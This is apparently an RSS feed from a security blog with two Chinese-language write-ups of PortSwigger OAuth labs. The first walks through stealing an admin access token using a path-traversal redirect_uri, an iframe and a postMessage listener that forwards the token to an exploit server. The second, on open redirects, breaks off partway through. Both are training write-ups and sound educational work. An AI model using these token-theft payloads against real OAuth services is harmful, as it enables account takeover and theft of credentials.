<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Oauth on en1r0py</title><link>/tags/oauth/</link><description>Recent content in Oauth on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 22 Dec 2024 13:33:08 +0800</lastBuildDate><atom:link href="/tags/oauth/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Stealing OAuth access tokens via a proxy page</title><link>/portswigger-posts/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page/</link><pubDate>Sun, 22 Dec 2024 13:33:08 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>登录，并点击&lt;code>Continue&lt;/code>，出现以下Request序列
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=cefvv41oq0lwkcnh9d5ym&amp;amp;redirect_uri=https://0a89006d035badd680d0268d006900e0.web-security-academy.net/oauth-callback&amp;amp;response_type=token&amp;amp;nonce=1926909250&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/oU4KNwQuladMWbXc9VYTn&amp;#34;&amp;gt;/interaction/oU4KNwQuladMWbXc9VYTn&amp;lt;/a&amp;gt;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;wiener&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;m0ucLGYyLJMSBfxUNV7Sgq0Ye9JMnbtL&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Peter Wiener&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;wiener@hotdog.com&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>重放第一个Request，并修改&lt;code>redirect_uri&lt;/code>，确认参数确实存在目录遍历攻击
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=cefvv41oq0lwkcnh9d5ym&amp;amp;redirect_uri=https://0a89006d035badd680d0268d006900e0.web-security-academy.net/oauth-callback../&amp;amp;response_type=token&amp;amp;nonce=1926909250&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/D_c8k2xC9RZiz4ofxVH4d&amp;#34;&amp;gt;/interaction/D_c8k2xC9RZiz4ofxVH4d&amp;lt;/a&amp;gt;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到主页，随机点选一篇文章的&lt;code>View post&lt;/code>，可看到有下列Request，从&lt;code>Javascript&lt;/code>代码使用&lt;code>postMessage()&lt;/code>方法将&lt;code>window.location.href&lt;/code>属性发送到其父窗口，通过此特性将&lt;code>redirect_url&lt;/code>和&lt;code>/post/comment/comment-form&lt;/code>请求结合使用
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /post/comment/comment-form &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a89006d035badd680d0268d006900e0.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">parent&lt;/span>.&lt;span style="color:#a6e22e">postMessage&lt;/span>({&lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;onload&amp;#39;&lt;/span>, &lt;span style="color:#a6e22e">data&lt;/span>&lt;span style="color:#f92672">:&lt;/span> window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">href&lt;/span>}, &lt;span style="color:#e6db74">&amp;#39;*&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">submitForm&lt;/span>(&lt;span style="color:#a6e22e">form&lt;/span>, &lt;span style="color:#a6e22e">ev&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ev&lt;/span>.&lt;span style="color:#a6e22e">preventDefault&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">formData&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">FormData&lt;/span>(document.&lt;span style="color:#a6e22e">getElementById&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;comment-form&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">hashParams&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">URLSearchParams&lt;/span>(window.&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">hash&lt;/span>.&lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">formData&lt;/span>.&lt;span style="color:#a6e22e">forEach&lt;/span>((&lt;span style="color:#a6e22e">v&lt;/span>, &lt;span style="color:#a6e22e">k&lt;/span>) =&amp;gt; &lt;span style="color:#a6e22e">o&lt;/span>[&lt;span style="color:#a6e22e">k&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">v&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">hashParams&lt;/span>.&lt;span style="color:#a6e22e">forEach&lt;/span>((&lt;span style="color:#a6e22e">v&lt;/span>, &lt;span style="color:#a6e22e">k&lt;/span>) =&amp;gt; &lt;span style="color:#a6e22e">o&lt;/span>[&lt;span style="color:#a6e22e">k&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">v&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">parent&lt;/span>.&lt;span style="color:#a6e22e">postMessage&lt;/span>({&lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;oncomment&amp;#39;&lt;/span>, &lt;span style="color:#a6e22e">content&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>}, &lt;span style="color:#e6db74">&amp;#39;*&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">form&lt;/span>.&lt;span style="color:#a6e22e">reset&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">/script&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>点击最上方&lt;code>Go to exploit server&lt;/code>，并在Body构造&lt;code>&amp;lt;iframe src=&amp;quot;https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&amp;amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&amp;amp;response_type=token&amp;amp;nonce=-1552239120&amp;amp;scope=openid%20profile%20email&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code>，并在其下方新增&lt;code>javascript&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">script&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> window.&lt;span style="color:#a6e22e">addEventListener&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;message&amp;#39;&lt;/span>, &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> encodeURIComponent(&lt;span style="color:#a6e22e">e&lt;/span>.&lt;span style="color:#a6e22e">data&lt;/span>.&lt;span style="color:#a6e22e">data&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }, &lt;span style="color:#66d9ef">false&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">/script&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img alt="Exploit bdoy" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-2.jpg">&lt;/li>
&lt;li>点击最下方的&lt;code>Store、Deliver expolit to victim&lt;/code>后点击&lt;code>Access log&lt;/code>
&lt;img alt="Access log" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page-3.jpg">&lt;/li>
&lt;li>重放步骤1的第二个Request，并将&lt;code>Authorization: Bearer&lt;/code>参数更换为Admin的&lt;code>access_token&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a5a00e20355addd802824dd026a001a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authorization&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Bearer &lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;administrator&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;sN3GREEdlVzIV4u4F34rM6sRzXTkj6J7&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Administrator&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;administrator@normal-user.net&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到主页，点击最上方的&lt;code>Submit solution&lt;/code>，并输入apikey内容即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Stealing OAuth access tokens via an open redirect</title><link>/portswigger-posts/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect/</link><pubDate>Thu, 19 Dec 2024 21:24:42 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>点击右上角&lt;code>My account&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=gdhf6fwltqrgrrf9024ay&amp;amp;redirect_uri=https://0a7800fc0331631f823f21eb00500072.web-security-academy.net/oauth-callback&amp;amp;response_type=token&amp;amp;nonce=-321443983&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/9vBHInlScXFwj3XcnV1xg&amp;#34;&amp;gt;/interaction/9vBHInlScXFwj3XcnV1xg&amp;lt;/a&amp;gt;.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /interaction/9vBHInlScXFwj3XcnV1xg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>使用&lt;code>wiener:peter&lt;/code>登录，并且点击&lt;code>Continue&lt;/code>，在对应的Response中出现&lt;code>apikey&lt;/code>，且其Request使用&lt;code>Authorization&lt;/code>进行鉴权&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /me &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authorization&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Bearer h1tx7R8XSBLKP6-fOv05F8Zl7mskjzNWtm1TDLg2f7X&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sub&amp;#34;: &amp;#34;wiener&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;apikey&amp;#34;: &amp;#34;VRIUm4vS3kRD5yzDek15MQj6Ypi16A9r&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;name&amp;#34;: &amp;#34;Peter Wiener&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email&amp;#34;: &amp;#34;wiener@hotdog.com&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;email_verified&amp;#34;: true
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>回放步骤1的&lt;code>/auth&lt;/code>请求，尝试修改&lt;code>redirect_uri&lt;/code>为&lt;code>https://www.google.com&lt;/code>，获得以下错误&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=gdhf6fwltqrgrrf9024ay&amp;amp;redirect_uri=https://www.google.com&amp;amp;response_type=token&amp;amp;nonce=-321443983&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect-2.jpg">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>确认&lt;code>redirect_uri&lt;/code>参数确实存在目录遍历攻击，尝试修改&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /auth?client_id=gdhf6fwltqrgrrf9024ay&amp;amp;redirect_uri=https://0a7800fc0331631f823f21eb00500072.web-security-academy.net/oauth-callback/../post?postId=1&amp;amp;response_type=token&amp;amp;nonce=-321443983&amp;amp;scope=openid%20profile%20email &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0adb0035038b63ce82f11fe202cb000a.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Redirecting to &amp;lt;a href=&amp;#34;/interaction/GBJNdgQYfIKP3EGdZddwM&amp;#34;&amp;gt;/interaction/GBJNdgQYfIKP3EGdZddwM&amp;lt;/a&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>回到主页，随机点选一篇文章的&lt;code>View post&lt;/code>，进入后点选最下方&lt;code>Next post&lt;/code>，对应Request&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /post/next?path=/post?postId=2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a7800fc0331631f823f21eb00500072.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>HTTP/2 302 Found
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
